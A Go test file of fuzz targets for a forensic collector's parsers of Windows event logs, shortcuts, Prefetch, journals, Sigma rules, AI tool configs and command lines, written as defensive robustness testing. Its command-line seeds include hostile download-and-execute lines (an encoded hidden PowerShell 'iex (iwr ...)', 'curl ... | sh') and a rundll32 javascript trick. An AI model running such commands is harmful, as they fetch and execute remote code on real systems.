package collector

import (
	"encoding/hex"
	"testing"
)

// Native fuzz targets for the parsers that read attacker-controlled bytes.
// `go test` runs each seed as an ordinary test; `go test -fuzz=FuzzX` explores
// further. The property under test is always the same: hostile input may be
// rejected, but it must not panic, hang or allocate without bound.

func fuzzHex(f *testing.F, s string) []byte {
	f.Helper()
	b, err := hex.DecodeString(s)
	if err != nil {
		f.Fatal(err)
	}
	return b
}

func FuzzParseEvtx(f *testing.F) {
	root := encNode{name: "Event", children: []encNode{
		{name: "System", children: []encNode{
			{name: "EventID", text: "4624"},
			{name: "Channel", text: "Security"},
		}},
		{name: "EventData", children: []encNode{{name: "Data", text: "x"}}},
	}}
	f.Add(buildEvtx(7, ftJun2021, encFragmentAt(recordBase, root)))
	f.Add(buildEvtx(8, ftJan2021, encTemplateFragmentAt(recordBase, root, nil)))
	f.Add([]byte(evtxFileMagic))
	f.Fuzz(func(t *testing.T, data []byte) {
		recs, _, _ := parseEvtx(data, 64)
		for _, r := range recs {
			if r.Root != nil {
				_, _, _ = classifyEvent("Security", r)
			}
		}
	})
}

func FuzzParseLNK(f *testing.F) {
	for _, s := range []string{lnkIDListPS, lnkLinkInfo, lnkRelative} {
		f.Add(fuzzHex(f, s))
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if l, err := parseLNK(data); err == nil {
			_ = l.Command()
		}
	})
}

func FuzzParsePrefetch(f *testing.F) {
	vol := volSpec{dev: `\VOLUME{01d7a1b2c3d4e5f6-a1b2c3d4}`, serial: 0xA1B2C3D4, created: ftJan2021}
	names := []string{`\VOLUME{01d7a1b2c3d4e5f6-a1b2c3d4}\WINDOWS\SYSTEM32\CMD.EXE`}
	f.Add(buildSCCA(30, "CMD.EXE", 0xDEADBEEF, 7, []uint64{ftJun2021}, vol, names))
	f.Add(buildSCCA(23, "APP.EXE", 0x12345678, 3, []uint64{ftJan2021}, vol, names))
	f.Add([]byte("MAM\x04\x00\x10\x00\x00"))
	f.Fuzz(func(t *testing.T, data []byte) {
		if pf, err := decodePrefetchFile(data); err == nil {
			_ = prefetchFindings(pf)
		}
	})
}

func FuzzXpressHuffman(f *testing.F) {
	f.Add(make([]byte, 256), 16)
	f.Add(xpEncodeBlock(nil, []xpTok{{lit: 'a', isLit: true}, {lit: 'b', isLit: true}}), 2)
	f.Fuzz(func(t *testing.T, data []byte, size int) {
		if size < 0 || size > 1<<20 {
			return
		}
		out, err := xpressHuffmanDecompress(data, size)
		if err == nil && len(out) != size {
			t.Fatalf("decoded %d bytes, promised %d", len(out), size)
		}
	})
}

func FuzzJournalFile(f *testing.F) {
	f.Add(buildJournal(false, [][]string{{"MESSAGE=a", "_PID=1"}, {"MESSAGE=b"}}))
	f.Add(buildJournal(true, [][]string{{"MESSAGE=a", "_COMM=sshd"}}))
	f.Fuzz(func(t *testing.T, data []byte) {
		j, err := openJournal(data)
		if err != nil {
			return
		}
		n := 0
		j.entries(func(e *journalEntry) bool {
			_ = e.Get("MESSAGE")
			n++
			return n < 4096
		})
	})
}

func FuzzLZ4Block(f *testing.F) {
	f.Add([]byte{0x10, 'a'}, 1)
	f.Add([]byte{0x1f, 'a', 1, 0, 0xff, 0x04}, 300)
	f.Fuzz(func(t *testing.T, data []byte, size int) {
		if size < 0 || size > 1<<20 {
			return
		}
		out, err := lz4Block(data, size)
		if err == nil && len(out) != size {
			t.Fatalf("decoded %d bytes, promised %d", len(out), size)
		}
	})
}

func FuzzAppCompatCache(f *testing.F) {
	f.Add([]byte("\x34\x00\x00\x00"))
	f.Fuzz(func(t *testing.T, data []byte) { _, _ = parseAppCompatCache(data) })
}

func FuzzTaskXML(f *testing.F) {
	f.Add([]byte(`<?xml version="1.0"?><Task><Actions><Exec><Command>cmd.exe</Command><Arguments>/c x</Arguments></Exec></Actions></Task>`))
	f.Add([]byte{0xff, 0xfe, '<', 0, 'T', 0})
	f.Fuzz(func(t *testing.T, data []byte) { _, _ = parseTaskXML(data) })
}

func FuzzSigmaRule(f *testing.F) {
	f.Add([]byte("title: t\nlogsource:\n  product: windows\n  service: security\ndetection:\n  sel:\n    EventID: 4624\n    User|contains|all:\n      - a\n      - b\n  filter:\n    Image|endswith: '\\x.exe'\n  condition: sel and not filter\nlevel: high\n"))
	f.Add([]byte("title: agg\ndetection:\n  s:\n    EventID: 4625\n  timeframe: 5m\n  condition: s | count() by TargetUserName > 5\n"))
	f.Add([]byte("title: q\ndetection:\n  a: {x|re: '^a+$'}\n  b: [one, two]\n  condition: 1 of them\n"))
	ev := winEvent{EventID: 4624, Channel: "Security", Data: map[string]string{"User": "ab", "Image": `c:\x.exe`}}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 1<<16 {
			return
		}
		rs := &SigmaRuleset{}
		rs.compileFile("fuzz.yml", data)
		_ = rs.match(ev)
		if rs.hasAggregations() {
			a := rs.newAggregator()
			a.observe(ev)
			_ = a.flush()
		}
	})
}

func FuzzAIConfig(f *testing.F) {
	f.Add([]byte(`{"mcpServers":{"a":{"command":"npx","args":["-y","x"],"env":{"K":"v"}}},"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"x"}]}]}}`), false)
	f.Add([]byte("[mcp_servers.a]\ncommand = \"npx\"\nargs = [\"-y\", \"x\"]\n"), true)
	f.Fuzz(func(t *testing.T, data []byte, toml bool) {
		if len(data) > 1<<16 {
			return
		}
		_, _, _ = parseAIConfig("fuzz", "cfg", data, toml)
	})
}

func FuzzCommandLine(f *testing.F) {
	f.Add(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "powershell -nop -w hidden -enc "+psEncode("iex (iwr http://203.0.113.9/a)"))
	f.Add("/usr/bin/bash", `bash -c "curl http://203.0.113.9/a | sh"`)
	f.Add("rundll32.exe", `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";x`)
	f.Fuzz(func(t *testing.T, image, cmd string) {
		if len(cmd) > 1<<14 {
			return
		}
		_ = analyzeCommandLine("process", image, cmd)
	})
}

func FuzzNetTables(f *testing.F) {
	f.Add(make([]byte, 4+24))
	f.Add([]byte{1, 0, 0, 0})
	f.Fuzz(func(t *testing.T, data []byte) {
		_, _ = parseTCP4Table(data)
		_, _ = parseTCP6Table(data)
		_, _ = parseUDP4Table(data)
		_, _ = parseUDP6Table(data)
		_, _ = parseModuleList(data, 8, func(b []byte) string { return string(b) })
		_, _ = parseModuleList(data, 4, func(b []byte) string { return string(b) })
		_, _ = parseProcNet(data, false)
		_, _ = parseProcNet(data, true)
	})
}
